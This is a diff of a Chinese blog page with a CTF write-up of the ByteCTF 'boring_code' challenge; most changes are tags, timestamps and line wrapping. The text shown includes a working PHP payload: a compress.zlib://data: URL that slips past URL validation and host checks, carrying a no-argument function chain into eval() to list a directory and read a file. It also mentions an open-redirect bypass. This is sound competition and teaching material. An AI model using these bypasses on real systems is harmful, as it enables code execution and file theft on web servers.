@@ -9,7 +9,7 @@
   <title>上海 CTF Write Up（附Boring_code） | Knlvre</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="Bytectf boring_code因为 decade 这道题涉及到 boring_code 的知识点，所以决定在本文章中复现一下这道题目 题目源码 12345678910111213141516171819202122232425262728293031323334&amp;lt;?phpfunction is_valid_url($url) &amp;#123;    if (filter_var($url">
-<meta name="keywords" content="CTF-Web">
+<meta name="keywords" content="CTF比赛">
 <meta property="og:type" content="article">
 <meta property="og:title" content="上海 CTF Write Up（附Boring_code）">
 <meta property="og:url" content="https://knlvre.github.io/Knlvre.github-io/2019/10/30/上海CTF Write Up/index.html">
@@ -30,7 +30,7 @@
 <meta property="og:image" content="https://github.com/Knlvre/Knlvre.github-io/raw/master/img/%E4%B8%8A%E6%B5%B7CTF/3-2.png">
 <meta property="og:image" content="https://github.com/Knlvre/Knlvre.github-io/raw/master/img/%E4%B8%8A%E6%B5%B7CTF/3-4.png">
 <meta property="og:image" content="https://github.com/Knlvre/Knlvre.github-io/raw/master/img/%E4%B8%8A%E6%B5%B7CTF/3-3.png">
-<meta property="og:updated_time" content="2019-11-06T12:14:07.736Z">
+<meta property="og:updated_time" content="2019-11-07T21:52:45.742Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="上海 CTF Write Up（附Boring_code）">
 <meta name="twitter:description" content="Bytectf boring_code因为 decade 这道题涉及到 boring_code 的知识点，所以决定在本文章中复现一下这道题目 题目源码 12345678910111213141516171819202122232425262728293031323334&amp;lt;?phpfunction is_valid_url($url) &amp;#123;    if (filter_var($url">
@@ -188,17 +188,18 @@
 <p>① 氪金，购买一个含有 baidu.com 的域名</p>
 <p>② 使用 ftp 协议： <a href="ftp://ip:port,baidu.com:80/filename.txt" target="_blank" rel="noopener">ftp://ip:port,baidu.com:80/filename.txt</a></p>
 <p>③ 使用一个百度的任意跳转的漏洞，具体可以参考 ：<a href="https://www.4xseo.com/marketing/1280/#title-0" target="_blank" rel="noopener">https://www.4xseo.com/marketing/1280/#title-0</a></p>
-<p>④  compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</p>
+<p>④  compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end(scandir(chr(pos(localtime(time(</p>
+<p>chdir(next(scandir(pos(localeconv()))))))))))));</p>
 </blockquote>
 <p><code>$code</code>的值通过<code>file_get_content()</code>函数获取，而它正是<code>eval()</code>的参数，所以我们才要想尽办法绕过第一层把这个 $code 送进去 eval() 函数内。上面提到的4种方法中，氪金当然是最简单直接地，但是如果不氪金，选择第4种方法</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br></pre></td></tr></table></figure>
 <p>看一下<code>filter_var()</code>、<code>parse_url()</code>、<code>file_get_content()</code>对它的处理</p>
 <p>filter_var()</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(filter_var(<span class="string">"compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));"</span>, FILTER_VALIDATE_URL));</span><br><span class="line">string(<span class="number">140</span>) <span class="string">"compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));"</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(filter_var(<span class="string">"compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end</span></span><br><span class="line"><span class="string">(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));"</span>, FILTER_VALIDATE_URL));</span><br><span class="line"></span><br><span class="line">string(<span class="number">140</span>) <span class="string">"compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end(scandir(chr(pos(localtime</span></span><br><span class="line"><span class="string">(time(chdir(next(scandir(pos(localeconv()))))))))))));"</span></span><br></pre></td></tr></table></figure>
 <p>parse_url()</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(parse_url(<span class="string">"compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));"</span>));</span><br><span class="line"><span class="keyword">array</span>(<span class="number">6</span>) &#123;</span><br><span class="line">  [<span class="string">"scheme"</span>]=&gt;</span><br><span class="line">  string(<span class="number">13</span>) <span class="string">"compress.zlib"</span></span><br><span class="line">  [<span class="string">"host"</span>]=&gt;</span><br><span class="line">  string(<span class="number">9</span>) <span class="string">"baidu.com"</span></span><br><span class="line">  [<span class="string">"user"</span>]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">"data"</span></span><br><span class="line">  [<span class="string">"pass"</span>]=&gt;</span><br><span class="line">  string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">  [<span class="string">"path"</span>]=&gt;</span><br><span class="line">  string(<span class="number">10</span>) <span class="string">"/baidu.com"</span></span><br><span class="line">  [<span class="string">"query"</span>]=&gt;</span><br><span class="line">  string(<span class="number">98</span>) <span class="string">",echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(parse_url(<span class="string">"compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end</span></span><br><span class="line"><span class="string">(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));"</span>));</span><br><span class="line"><span class="keyword">array</span>(<span class="number">6</span>) &#123;</span><br><span class="line">  [<span class="string">"scheme"</span>]=&gt;</span><br><span class="line">  string(<span class="number">13</span>) <span class="string">"compress.zlib"</span></span><br><span class="line">  [<span class="string">"host"</span>]=&gt;</span><br><span class="line">  string(<span class="number">9</span>) <span class="string">"baidu.com"</span></span><br><span class="line">  [<span class="string">"user"</span>]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">"data"</span></span><br><span class="line">  [<span class="string">"pass"</span>]=&gt;</span><br><span class="line">  string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">  [<span class="string">"path"</span>]=&gt;</span><br><span class="line">  string(<span class="number">10</span>) <span class="string">"/baidu.com"</span></span><br><span class="line">  [<span class="string">"query"</span>]=&gt;</span><br><span class="line">  string(<span class="number">98</span>) <span class="string">",echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>file_get_contents()</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">echo</span>(file_get_contents(<span class="string">"compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));"</span>));</span><br><span class="line"><span class="keyword">echo</span>(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">echo</span>(file_get_contents(<span class="string">"compress.zlib://data:@baidu.com/baidu.com?,</span></span><br><span class="line"><span class="string">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));"</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br></pre></td></tr></table></figure>
 <p>从结果可以看到，该payload：①通过了 filter_var() 的检查；②通过了关于 data:// 的正则匹配；③用过了经过 parse_url() 函数处理后，host 参数匹配 baidu.com 的检查；④在经过 file_get_contents() 函数处理后，为 $code 参数赋值</p>
 <p>太强了</p>
 <p><strong>Bypass 第二层</strong></p>
@@ -369,7 +370,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">CTF-Web</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">CTF比赛</a>
         		</li>
       		
 		</ul>
@@ -576,15 +577,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">DVWA</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
               </li>
              
               <li class="article-tag-list-item">
